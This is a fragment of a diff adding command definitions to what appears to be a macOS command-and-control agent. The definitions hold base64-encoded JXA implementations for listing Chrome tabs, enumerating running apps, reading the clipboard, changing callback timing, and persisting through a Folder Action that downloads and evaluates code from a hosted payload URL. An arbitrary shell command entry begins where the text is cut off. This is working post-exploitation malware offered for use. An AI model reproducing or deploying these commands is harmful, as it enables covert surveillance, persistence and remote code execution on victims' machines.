"ZnVuY3Rpb24odGFzaywgcmVzcG9uc2VzKXsKICBpZih0YXNrLmNvbXBsZXRlZCA9PT0gdHJ1ZSAmJiB0YXNrLnN0YXR1cyAhPT0gJ2Vycm9yJyl7CiAgICB0cnl7CiAgICAgICAgbGV0IHN0YXR1cyA9IEpTT04ucGFyc2UocmVzcG9uc2VzWzBdWydyZXNwb25zZSddKTsKICAgICAgICBpZihzdGF0dXMuaGFzT3duUHJvcGVydHkoJ2FnZW50X2ZpbGVfaWQnKSl7CiAgICAgICAgCWxldCBmaWxlX25hbWUgPSB0YXNrWydwYXJhbXMnXTsKCQkgICAgICBsZXQgb3V0cHV0ID0gIjxkaXYgY2xhc3M9J2NhcmQnPjxkaXYgY2xhc3M9J2NhcmQtaGVhZGVyIGJvcmRlciBib3JkZXItZGFyayBzaGFkb3cnPkZpbmlzaGVkIERvd25sb2FkaW5nIDxzcGFuIGNsYXNzPSdkaXNwbGF5Jz4iICsgZmlsZV9uYW1lICsgIjwvc3Bhbj4uIENsaWNrIDxhIGhyZWY9Jy9hcGkvdjEuNC9maWxlcy9kb3dubG9hZC8iICsgc3RhdHVzWydhZ2VudF9maWxlX2lkJ10gKyAiJz5oZXJlPC9hPiB0byBkb3dubG9hZDwvZGl2PjwvZGl2PiI7CgkJICAgICAgcmV0dXJuIG91dHB1dDsKCSAgICAJfQogICAgfWNhdGNoKGVycm9yKXsKICAgICAgIHJldHVybiAiPHByZT5FcnJvcjogIiArIGVycm9yLnRvU3RyaW5nKCkgKyAiXG4iICsgSlNPTi5zdHJpbmdpZnkocmVzcG9uc2VzLCBudWxsLCAyKSArICI8L3ByZT4iOwogICAgfQogIH0KICBpZih0YXNrLnN0YXR1cyA9PT0gJ2Vycm9yJyl7CiAgCXJldHVybiAiPHByZT4gRXJyb3I6IHVudG9nZ2xlIGZvciBlcnJvciBtZXNzYWdlKHMpIDwvcHJlPiI7CiAgfQogIHJldHVybiAiPHByZT4gRG93bmxvYWRpbmcuLi4gPC9wcmU+IjsKfQ=="
+        },
+        {
+          "needs_admin": false,
+          "help_cmd": "chrome_tabs",
+          "version": 1,
+          "is_exit": false,
+          "is_file_browse": false,
+          "file_browse_parameters": "",
+          "is_process_list": false,
+          "process_list_parameters": "",
+          "is_download_file": false,
+          "download_file_parameters": "",
+          "is_remove_file": false,
+          "remove_file_parameters": "",
+          "is_agent_generator": false,
+          "author": "",
+          "deleted": false,
+          "description": "This uses JXA to list information about all of the open tabs in all of the open Chrome instances. If Chrome is not currently running, this will launch Chrome (potential OPSEC issue) and might have a conflict with trying to access Chrome tabs as Chrome is starting. It's recommended to not use this unless Chrome is already running. Use the list_apps function to check if Chrome is running.\nIn Mojave this will cause a popup the first time asking for permission for your process to access Chrome.",
+          "cmd": "chrome_tabs",
+          "parameters": [],
+          "attack": [
+            {
+              "t_num": "T1010",
+              "attack_name": "Application Window Discovery"
+            }
+          ],
+          "artifacts": [],
+          "files": [
+            {
+              "chrome_tabs.js": "ZXhwb3J0cy5jaHJvbWVfdGFicyA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CglsZXQgdGFicyA9IHt9OwoJdHJ5ewoJCWxldCBjaCA9IEFwcGxpY2F0aW9uKCJHb29nbGUgQ2hyb21lIik7CgkJaWYoY2gucnVubmluZygpKXsKICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBjaC53aW5kb3dzLmxlbmd0aDsgaSsrKXsKICAgICAgICAgICAgICAgIGxldCB3aW4gPSBjaC53aW5kb3dzW2ldOwogICAgICAgICAgICAgICAgdGFic1siV2luZG93ICIgKyBpXSA9IHt9OwogICAgICAgICAgICAgICAgZm9yIChsZXQgaiA9IDA7IGogPCB3aW4udGFicy5sZW5ndGg7IGorKyl7CiAgICAgICAgICAgICAgICAgICAgbGV0IHRhYiA9IHdpbi50YWJzW2pdOwogICAgICAgICAgICAgICAgICAgIHRhYnNbIldpbmRvdyAiICsgaV1bIlRhYiAiICsgal0gPSB7InRpdGxlIjogdGFiLnRpdGxlKCksICJ1cmwiOiB0YWIudXJsKCl9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogIkNocm9tZSBpcyBub3QgcnVubmluZyIsICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICAgICAgfQoJfWNhdGNoKGVycm9yKXsKCQlsZXQgZXJyID0gZXJyb3IudG9TdHJpbmcoKTsKCQlpZihlcnIgPT09ICJFcnJvcjogQW4gZXJyb3Igb2NjdXJyZWQuIil7CgkJICAgIGVyciArPSAiIEFwZmVsbCB3YXMgZGVuaWVkIGFjY2VzcyB0byBHb29nbGUgQ2hyb21lIChlaXRoZXIgYnkgcG9wdXAgb3IgcHJpb3IgZGVueSkuIjsKCQl9CgkJcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVyciwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKCX0KCXJldHVybiB7InVzZXJfb3V0cHV0IjogSlNPTi5zdHJpbmdpZnkodGFicywgbnVsbCwgMiksICJjb21wbGV0ZWQiOiB0cnVlfTsKfTsKQ09NTUFORF9FTkRTX0hFUkU="
+            }
+          ],
+          "transforms": []
+        },
+        {
+          "needs_admin": false,
+          "help_cmd": "list_apps",
+          "version": 1,
+          "is_exit": false,
+          "is_file_browse": false,
+          "file_browse_parameters": "",
+          "is_process_list": true,
+          "process_list_parameters": "",
+          "is_download_file": false,
+          "download_file_parameters": "",
+          "is_remove_file": false,
+          "remove_file_parameters": "",
+          "is_agent_generator": false,
+          "author": "",
+          "deleted": false,
+          "description": "This uses NSApplication.RunningApplications api to get information about running applications.",
+          "cmd": "list_apps",
+          "parameters": [],
+          "attack": [
+            {
+              "t_num": "T1057",
+              "attack_name": "Process Discovery"
+            }
+          ],
+          "artifacts": [],
+          "files": [
+            {
+              "list_apps.js": "ZXhwb3J0cy5saXN0X2FwcHMgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgT2JqQy5pbXBvcnQoJ0FwcEtpdCcpOwogICAgdHJ5ewogICAgICAgIGxldCBuYW1lcyA9IFtdOwogICAgICAgIGxldCBwcm9jcyA9ICQuTlNXb3Jrc3BhY2Uuc2hhcmVkV29ya3NwYWNlLnJ1bm5pbmdBcHBsaWNhdGlvbnMuanM7CiAgICAgICAgZm9yKGxldCBpID0gMDsgaSA8IHByb2NzLmxlbmd0aDsgaSsrKXsKICAgICAgICAgICAgbGV0IGluZm8gPSB7fTsKICAgICAgICAgICAgaW5mb1snZnJvbnRNb3N0J10gPSBwcm9jc1tpXS5hY3RpdmU7CiAgICAgICAgICAgIGluZm9bJ2hpZGRlbiddID0gcHJvY3NbaV0uaGlkZGVuOwogICAgICAgICAgICBpbmZvWydidW5kbGUnXSA9IHByb2NzW2ldLmJ1bmRsZUlkZW50aWZpZXIuanM7CiAgICAgICAgICAgIGluZm9bJ2J1bmRsZVVSTCddID0gcHJvY3NbaV0uYnVuZGxlVVJMLnBhdGguanM7CiAgICAgICAgICAgIGluZm9bJ2Jpbl9wYXRoJ10gPSBwcm9jc1tpXS5leGVjdXRhYmxlVVJMLnBhdGguanM7CiAgICAgICAgICAgIGluZm9bJ3Byb2Nlc3NfaWQnXSA9IHByb2NzW2ldLnByb2Nlc3NJZGVudGlmaWVyOwogICAgICAgICAgICBpbmZvWyduYW1lJ10gPSBwcm9jc1tpXS5sb2NhbGl6ZWROYW1lLmpzOwogICAgICAgICAgICBpZihwcm9jc1tpXS5leGVjdXRhYmxlQXJjaGl0ZWN0dXJlID09PSAiMTY3NzcyMjMiKXsKICAgICAgICAgICAgICAgIGluZm9bJ2FyY2hpdGVjdHVyZSddID0gIng2NCI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZihwcm9jc1tpXS5leGVjdXRhYmxlQXJjaGl0ZWN0dXJlID09PSAiNyIpewogICAgICAgICAgICAgICAgaW5mb1snYXJjaGl0ZWN0dXJlJ10gPSAieDg2IjsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIGlmKHByb2NzW2ldLmV4ZWN1dGFibGVBcmNoaXRlY3R1cmUgPT09ICIxOCIpewogICAgICAgICAgICAgICAgaW5mb1snYXJjaGl0ZWN0dXJlJ10gPSAieDg2X1BQQyI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZihwcm9jc1tpXS5leGVjdXRhYmxlQXJjaGl0ZWN0dXJlID09PSAiMTY3NzcyMzQiKXsKICAgICAgICAgICAgICAgIGluZm9bJ2FyY2hpdGVjdHVyZSddID0gIng4Nl82NF9QUEMiOwogICAgICAgICAgICB9CiAgICAgICAgICAgIG5hbWVzLnB1c2goaW5mbyk7CiAgICAgICAgfQogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjpKU09OLnN0cmluZ2lmeShuYW1lcywgbnVsbCwgMiksICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJF"
+            }
+          ],
+          "transforms": [],
+          "browser_script": "ZnVuY3Rpb24odGFzaywgcmVzcG9uc2UpewoJaWYodGFzay5zdGF0dXMgPT09ICdlcnJvcicpewoJCXJldHVybiAiPHByZT4gRXJyb3I6IHVudG9nZ2xlIGZvciBlcnJvciBtZXNzYWdlKHMpIDwvcHJlPiI7Cgl9CiAgbGV0IHJvd3MgPSBbXTsKICBmb3IobGV0IGkgPSAwOyBpIDwgcmVzcG9uc2UubGVuZ3RoOyBpKyspewogICAgdHJ5ewogICAgICAgIGxldCBkYXRhID0gSlNPTi5wYXJzZShyZXNwb25zZVtpXVsncmVzcG9uc2UnXSk7CiAgICAgICAgbGV0IHJvd19zdHlsZSA9ICIiOwogIAkJCWxldCBjZWxsX3N0eWxlID0ge307CgkJICAgIE9iamVjdC5rZXlzKGRhdGEpLmZvckVhY2goZnVuY3Rpb24oeCl7CgkJICAgICAgdmFyIHIgPSBkYXRhW3hdOwoJCSAgICAgIHZhciByb3dfc3R5bGUgPSAiIjsKCQkgICAgICBpZihyWyduYW1lJ10uaW5jbHVkZXMoIjFQYXNzd29yZCIpKXtyb3dfc3R5bGU9ImJhY2tncm91bmQtY29sb3I6Z3JlZW47Y29sb3I6d2hpdGUifQoJCSAgICAgIGlmKHJbJ25hbWUnXS5pbmNsdWRlcygiVGVybSIpKXtyb3dfc3R5bGU9ImJhY2tncm91bmQtY29sb3I6cmVkO2NvbG9yOndoaXRlIn0KCQkgICAgICBpZihyWyduYW1lJ10uaW5jbHVkZXMoIlNuaXRjaCIpKXtyb3dfc3R5bGU9ImJhY2tncm91bmQtY29sb3I6cmVkO2NvbG9yOndoaXRlIn0KCQkgICAgICByb3dzLnB1c2goeyJwaWQiOiByWydwcm9jZXNzX2lkJ10sCgkJICAgICAgICAgICAgICAgICAibmFtZSI6IHJbJ25hbWUnXSwKCQkgICAgICAgICAgICAgICAgICJhcmNoIjogclsnYXJjaGl0ZWN0dXJlJ10sCgkJICAgICAgICAgICAgICAgICAiZnJvbnRNb3N0IjogclsnZnJvbnRNb3N0J10sCgkJICAgICAgICAgICAgICAgICAiYmluX3BhdGgiOiByWydiaW5fcGF0aCddLAoJCSAgICAgICAgICAgICAgICAgInJvdy1zdHlsZSI6IHJvd19zdHlsZSwKCQkgICAgICAgICAgICAgICAgICJjZWxsLXN0eWxlIjogeyJoaWRkZW4iOiAidGV4dC1hbGlnbjpjZW50ZXIiLAoJCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInBpZCI6InRleHQtYWxpZ246Y2VudGVyIn0KCQkgICAgICAgICAgICAgICAgIH0pOwoJCSAgICB9KTsKICAgIH0KICAgIGNhdGNoKGVycm9yKXsKICAgICAgICAiPHByZT5FcnJvcjogIiArIGVycm9yLnRvU3RyaW5nKCkgKyAiXG4iICsgSlNPTi5zdHJpbmdpZnkocmVzcG9uc2UsIG51bGwsIDIpICsgIjwvcHJlPiI7CiAgICB9CiAgfQogIGxldCBvdXRwdXQgPSBzdXBwb3J0X3NjcmlwdHNbJ2NyZWF0ZV90YWJsZSddKFt7Im5hbWUiOiJwaWQiLCJzaXplIjoiMmVtIn0seyJuYW1lIjoiYXJjaCIsInNpemUiOiIyZW0ifSx7Im5hbWUiOiJuYW1lIiwgInNpemUiOiIxMGVtIn0sIHsibmFtZSI6ImZyb250TW9zdCIsInNpemUiOiIzZW0ifSx7Im5hbWUiOiJiaW5fcGF0aCIsInNpemUiOiIyMGVtIn1dLCByb3dzKTsKICByZXR1cm4gb3V0cHV0Owp9"
+        },
+        {
+          "needs_admin": false,
+          "help_cmd": "sleep {integer interval}",
+          "version": 2,
+          "is_exit": false,
+          "is_file_browse": false,
+          "file_browse_parameters": "",
+          "is_process_list": false,
+          "process_list_parameters": "",
+          "is_download_file": false,
+          "download_file_parameters": "",
+          "is_remove_file": false,
+          "remove_file_parameters": "",
+          "is_agent_generator": false,
+          "author": "",
+          "deleted": false,
+          "description": "Modify the time between callbacks in seconds.",
+          "cmd": "sleep",
+          "parameters": [
+            {
+              "type": "Number",
+              "hint": "",
+              "choices": "",
+              "required": false,
+              "name": "jitter"
+            },
+            {
+              "type": "Number",
+              "hint": "",
+              "choices": "",
+              "required": false,
+              "name": "interval"
+            }
+          ],
+          "attack": [
+            {
+              "t_num": "T1029",
+              "attack_name": "Scheduled Transfer"
+            }
+          ],
+          "artifacts": [],
+          "files": [
+            {
+              "sleep.js": "ZXhwb3J0cy5zbGVlcCA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAgICAgbGV0IGNvbW1hbmRfcGFyYW1zID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgICAgIGlmKGNvbW1hbmRfcGFyYW1zLmhhc093blByb3BlcnR5KCdpbnRlcnZhbCcpICYmIGNvbW1hbmRfcGFyYW1zWydpbnRlcnZhbCddID49IDApewogICAgICAgICAgICBDMi5pbnRlcnZhbCA9IGNvbW1hbmRfcGFyYW1zWydpbnRlcnZhbCddOwogICAgICAgIH0KICAgICAgICBpZihjb21tYW5kX3BhcmFtcy5oYXNPd25Qcm9wZXJ0eSgnaml0dGVyJykgJiYgY29tbWFuZF9wYXJhbXNbJ2ppdHRlciddID49IDAgJiYgY29tbWFuZF9wYXJhbXNbJ2ppdHRlciddIDw9IDEwMCl7CiAgICAgICAgICAgIEMyLmppdHRlciA9IGNvbW1hbmRfcGFyYW1zWydqaXR0ZXInXTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJTbGVlcCBpbnRlcnZhbCB1cGRhdGVkIHRvICIgKyBDMi5pbnRlcnZhbCArICIgYW5kIHNsZWVwIGppdHRlciB1cGRhdGVkIHRvICIgKyBDMi5qaXR0ZXIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CgpDT01NQU5EX0VORFNfSEVSRQ=="
+            }
+          ],
+          "transforms": [
+            {
+              "order": 1,
+              "parameter": "",
+              "active": true,
+              "description": "",
+              "timestamp": "05\/07\/2020 07:01:49",
+              "command": "sleep",
+              "command_id": 54,
+              "payload_type": "apfell-jxa",
+              "transform": "apfelljxa_sleep_shorthand",
+              "parameter_type": "None"
+            }
+          ]
+        },
+        {
+          "needs_admin": false,
+          "help_cmd": "clipboard [data]",
+          "version": 3,
+          "is_exit": false,
+          "is_file_browse": false,
+          "file_browse_parameters": "",
+          "is_process_list": false,
+          "process_list_parameters": "",
+          "is_download_file": false,
+          "download_file_parameters": "",
+          "is_remove_file": false,
+          "remove_file_parameters": "",
+          "is_agent_generator": false,
+          "author": "",
+          "deleted": false,
+          "description": "This will return the current clipboard contents on the target machine. If [data] is supplied, it will set the clipboard to [data].",
+          "cmd": "clipboard",
+          "parameters": [],
+          "attack": [
+            {
+              "t_num": "T1115",
+              "attack_name": "Clipboard Data"
+            }
+          ],
+          "artifacts": [],
+          "files": [
+            {
+              "clipboard.js": "ZXhwb3J0cy5jbGlwYm9hcmQgPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewogICAgbGV0IHJlc3BvbnNlID0gIiI7CiAgICBPYmpDLmltcG9ydCgnQXBwS2l0Jyk7CiAgICBpZihwYXJhbXMgIT09IHVuZGVmaW5lZCAmJiBwYXJhbXMgIT09ICIiKXsKICAgICAgICAvLyBUcnkgc2V0dGluZyB0aGUgY2xpcGJvYXJkIHRvIHdoYXRldmVyIGlzIGluIHBhcmFtcwogICAgICAgIHRyeXsKICAgICAgICAgICAgJC5OU1Bhc3RlYm9hcmQuZ2VuZXJhbFBhc3RlYm9hcmQuY2xlYXJDb250ZW50czsKICAgICAgICAgICAgJC5OU1Bhc3RlYm9hcmQuZ2VuZXJhbFBhc3RlYm9hcmQuc2V0U3RyaW5nRm9yVHlwZSgkKHBhcmFtcyksICQuTlNQYXN0ZWJvYXJkVHlwZVN0cmluZyk7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjogIlN1Y2Nlc3NmdWxseSBzZXQgdGhlIGNsaXBib2FyZCIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICB9CiAgICAgICAgY2F0Y2goZXJyb3IpewogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICB9CiAgICB9CiAgICBlbHNlewogICAgICAgIC8vdHJ5IGp1c3QgcmVhZGluZyB0aGUgY2xpcGJvYXJkIGRhdGEgYW5kIHJldHVybmluZyBpdAogICAgICAgIHRyeXsKICAgICAgICAgICAgbGV0IHBiID0gJC5OU1Bhc3RlYm9hcmQuZ2VuZXJhbFBhc3RlYm9hcmQ7CiAgICAgICAgICAgIGxldCBvdXRwdXQgPSBwYi5zdHJpbmdGb3JUeXBlKCQuTlNQYXN0ZWJvYXJkVHlwZVN0cmluZykuanM7CiAgICAgICAgICAgIC8vdmFyIG91dHB1dCA9IGN1cnJlbnRBcHAudGhlQ2xpcGJvYXJkKCk7CiAgICAgICAgICAgIGlmKG91dHB1dCA9PT0gIiIgfHwgb3V0cHV0ID09PSB1bmRlZmluZWQpewogICAgICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJOb3RoaW5nIG9uIHRoZSBjbGlwYm9hcmQiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiBTdHJpbmcob3V0cHV0KSwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgICAgIH0KICAgICAgICBjYXRjaChlcnJvcil7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
+            }
+          ],
+          "transforms": []
+        },
+        {
+          "needs_admin": false,
+          "help_cmd": "persist_folderaction {\"folder\": \"\/path\/to\/folder\", \"script_path\": \"\/path\/to\/script\/to\/put\/on\/disk.scpt\", \"url\": \"http:\/\/url.of.hosted\/payload\"}",
+          "version": 1,
+          "is_exit": false,
+          "is_file_browse": false,
+          "file_browse_parameters": "",
+          "is_process_list": false,
+          "process_list_parameters": "",
+          "is_download_file": false,
+          "download_file_parameters": "",
+          "is_remove_file": false,
+          "remove_file_parameters": "",
+          "is_agent_generator": false,
+          "author": "",
+          "deleted": false,
+          "description": "Use Folder Actions to persist a compiled script on disk. You can either specify a 'URL' and automatically do a backgrounding one-liner, or supply your own code and language.",
+          "cmd": "persist_folderaction",
+          "parameters": [
+            {
+              "type": "String",
+              "hint": "osascript code",
+              "choices": "",
+              "required": false,
+              "name": "code"
+            },
+            {
+              "type": "String",
+              "hint": "http:\/\/url.of.hosted\/payload",
+              "choices": "",
+              "required": false,
+              "name": "url"
+            },
+            {
+              "type": "String",
+              "hint": "\/path\/to\/folder\/to\/watch",
+              "choices": "",
+              "required": true,
+              "name": "folder"
+            },
+            {
+              "type": "String",
+              "hint": "\/path\/to\/script\/to\/create\/on\/disk",
+              "choices": "",
+              "required": true,
+              "name": "script_path"
+            },
+            {
+              "type": "Choice",
+              "hint": "",
+              "choices": "JavaScript\nAppleScript",
+              "required": false,
+              "name": "language"
+            }
+          ],
+          "attack": [],
+          "artifacts": [],
+          "files": [
+            {
+              "persist_folderaction.js": "ZXhwb3J0cy5wZXJzaXN0X2ZvbGRlcmFjdGlvbiA9IGZ1bmN0aW9uKHRhc2ssIGNvbW1hbmQsIHBhcmFtcyl7CiAgICB0cnl7CiAgICAJLy8gPT09PT09PSBHZXQgcGFyYW1zID09PT09PT09CiAgICAJbGV0IGpzb25fcGFyYW1zID0gSlNPTi5wYXJzZShwYXJhbXMpOwogICAgCWxldCBmb2xkZXIgPSBqc29uX3BhcmFtc1snZm9sZGVyJ107CiAgICAJbGV0IHNjcmlwdF9wYXRoID0ganNvbl9wYXJhbXNbJ3NjcmlwdF9wYXRoJ107CiAgICAJbGV0IHVybCA9IGpzb25fcGFyYW1zWyd1cmwnXTsKICAgIAlsZXQgY29kZSA9IGpzb25fcGFyYW1zWydjb2RlJ107CiAgICAJbGV0IGxhbmcgPSBqc29uX3BhcmFtc1snbGFuZ3VhZ2UnXTsKICAgIAlsZXQgY29kZTEgPSAidmFyIGFwcCA9IEFwcGxpY2F0aW9uLmN1cnJlbnRBcHBsaWNhdGlvbigpO1xuIiArCiAgICAgICAgICAgICAgICAgICAgImFwcC5pbmNsdWRlU3RhbmRhcmRBZGRpdGlvbnMgPSB0cnVlO1xuIiArCiAgICAgICAgICAgICAgICAgICAgImFwcC5kb1NoZWxsU2NyaXB0KFwiIG9zYXNjcmlwdCAtbCBKYXZhU2NyaXB0IC1lIFxcXCJldmFsKE9iakMudW53cmFwKCQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhEYXRhRW5jb2RpbmcoJC5OU0RhdGEuZGF0YVdpdGhDb250ZW50c09mVVJMKCQuTlNVUkwuVVJMV2l0aFN0cmluZygnIjsKCQlsZXQgY29kZTIgPSAiJykpLCQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpKSk7XFxcIiAmPiAvZGV2L251bGwgJlwiKTsiOwoJCWxldCBvdXRwdXQgPSAiIjsKICAgIAkvLyA9PT09PT09PSBDb21waWxlIGFuZCB3cml0ZSBzY3JpcHQgdG8gZmlsZSA9PT09PT09PT09CiAgICAJT2JqQy5pbXBvcnQoJ09TQUtpdCcpOwogICAgCWxldCBteWxhbmcgPSAiIjsKICAgIAlsZXQgbXlzY3JpcHQgPSAiIjsKICAgIAlpZihjb2RlICE9PSAiIil7CiAgICAJCW15bGFuZyA9ICQuT1NBTGFuZ3VhZ2UubGFuZ3VhZ2VGb3JOYW1lKGxhbmcpOwogICAgCQlteXNjcmlwdCA9ICQuT1NBU2NyaXB0LmFsbG9jLmluaXRXaXRoU291cmNlTGFuZ3VhZ2UoJChjb2RlKSxteWxhbmcpOwogICAgCX1lbHNlewogICAgCQlteWxhbmcgPSAkLk9TQUxhbmd1YWdlLmxhbmd1YWdlRm9yTmFtZSgiSmF2YVNjcmlwdCIpOwogICAgCQlteXNjcmlwdCA9ICQuT1NBU2NyaXB0LmFsbG9jLmluaXRXaXRoU291cmNlTGFuZ3VhZ2UoJChjb2RlMSArIHVybCArIGNvZGUyKSxteWxhbmcpOwogICAgCX0KCgkJbXlzY3JpcHQuY29tcGlsZUFuZFJldHVybkVycm9yKCQoKSk7CgkJbGV0IGRhdGEgPSBteXNjcmlwdC5jb21waWxlZERhdGFGb3JUeXBlVXNpbmdTdG9yYWdlT3B0aW9uc0Vycm9yKCJvc2FzIiwgMHgwMDAwMDAwMywgJCgpKTsKCQlkYXRhLndyaXRlVG9GaWxlQXRvbWljYWxseShzY3JpcHRfcGF0aCwgdHJ1ZSk7CgkJLy8gPT09PT09PSBIYW5kbGUgdGhlIGZvbGRlciBhY3Rpb24gcGVyc2lzdGVuY2UgPT09PT09PQogICAgICAgIGxldCBzZSA9IEFwcGxpY2F0aW9uKCJTeXN0ZW0gRXZlbnRzIik7CgkJc2UuZm9sZGVyQWN0aW9uc0VuYWJsZWQgPSB0cnVlOwoJCWxldCBmYV9leGlzdHMgPSBmYWxzZTsKCQlsZXQgc2NyaXB0X2V4aXN0cyA9IGZhbHNlOwoJCWxldCBteVNjcmlwdCA9IHNlLlNjcmlwdCh7bmFtZTogc2NyaXB0X3BhdGguc3BsaXQoIi8iKS5wb3AoKSwgcG9zaXhQYXRoOiBzY3JpcHRfcGF0aH0pOwoJCWxldCBmYSA9IHNlLkZvbGRlckFjdGlvbih7bmFtZTogZm9sZGVyLnNwbGl0KCIvIikucG9wKCksIHBhdGg6IGZvbGRlcn0pOwoJCS8vIGZpcnN0IGNoZWNrIHRvIHNlZSBpZiB0aGVyZSdzIGEgZm9sZGVyIGFjdGlvbiBmb3IgdGhlIHBhdGggd2UncmUgbG9va2luZyBhdAoJCWZvcihsZXQgaSA9IDA7IGkgPCBzZS5mb2xkZXJBY3Rpb25zLmxlbmd0aDsgaSsrKXsKCQkJaWYoc2UuZm9sZGVyQWN0aW9uc1tpXS5wYXRoKCkgPT09IGZvbGRlcil7CgkJCQkvLyBpZiBvdXIgZm9sZGVyIGFscmVhZHkgaGFzIGZvbGRlciBhY3Rpb25zLCBqdXN0IHRha2UgdGhlIHJlZmVyZW5jZSBmb3IgbGF0ZXIKCQkJCWZhID0gc2UuZm9sZGVyQWN0aW9uc1tpXTsKCQkJCWZhX2V4aXN0cyA9IHRydWU7CgkJCQlvdXRwdXQgKz0gIkZvbGRlciBhbHJlYWR5IGhhcyBmb2xkZXIgYWN0aW9uc1xuIjsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCS8vIGlmIHRoZSBmb2xkZXIgYWN0aW9uIGRvZXNuJ3QgZXhpc3QsIGFkZCBpdAoJCWlmKGZhX2V4aXN0cyA9PT0gZmFsc2UpewoJCQlzZS5mb2xkZXJBY3Rpb25zLnB1c2goZmEpOwoJCX0KCQkvLyBDaGVjayB0byBzZWUgaWYgdGhpcyBzY3JpcHQgYWxyZWFkeSBleGlzdHMgb24gdGhpcyBmb2xkZXIKCQlmb3IobGV0IGkgPSAwOyBpIDwgZmEuc2NyaXB0cy5sZW5ndGg7IGkrKyl7CgkJCWlmKGZhLnNjcmlwdHNbaV0ucG9zaXhQYXRoKCkgPT09ICBzY3JpcHRfcGF0aCl7CgkJCQlzY3JpcHRfZXhpc3RzID0gdHJ1ZTsKCQkJCW91dHB1dCArPSAiU2NyaXB0IGFscmVhZHkgYXNzaWduZWQgdG8gdGhpcyBmb2xkZXJcbiI7CgkJCQlicmVhazsKCQkJfQoJCX0KCQlpZihzY3JpcHRfZXhpc3RzID09PSBmYWxzZSl7CgkJCWZhLnNjcmlwdHMucHVzaChteVNjcmlwdCk7CgkJfQoJCW91dHB1dCArPSAiRm9sZGVyIEFjdGlvbiBlc3RhYmxpc2hlZCI7CgkJcmV0dXJuIHsidXNlcl9vdXRwdXQiOm91dHB1dCwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgfWNhdGNoKGVycm9yKXsKICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6ZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgIH0KfTsKQ09NTUFORF9FTkRTX0hFUkU="
+            }
+          ],
+          "transforms": []
+        },
+        {
+          "needs_admin": false,
+          "help_cmd": "shell {command}",
+          "version": 3,
+          "is_exit": false,
+          "is_file_browse": false,
+          "file_browse_parameters": "",
+          "is_process_list": false,
+          "process_list_parameters": "",
+          "is_download_file": false,
+          "download_file_parameters": "",
+          "is_remove_file": false,
+          "remove_file_parameters": "",
+          "is_agent_generator": false,
+          "author": "",
+          "deleted": false,
+          "description": "This runs {command} in a terminal by leveraging JXA's Application.doShellScript({command}).\n\nWARNING! THIS IS SINGLE THREADED, IF YOUR COMMAND HANGS, THE AGENT HANGS!",
+          "cmd": "shell",
+          "parameters": [
+            {
+              "type": "String",
+              "hint": "",
+              "choices": "",
+              "required": true,
+              "name": "command"
+            }
+          ],
+          "attack": [
+            {
+              "t_num": "T1059",
+              "attack_name": "Command-Line Interface"
+            }
+          ],
+          "artifacts": [
+            {
+              "command_parameter": "command",
+              "artifact": "Process Create",
+              "artifact_string": "sh -c *",
+              "replace_string": "*"
+            }
+          ],
+          "files": [
+            {
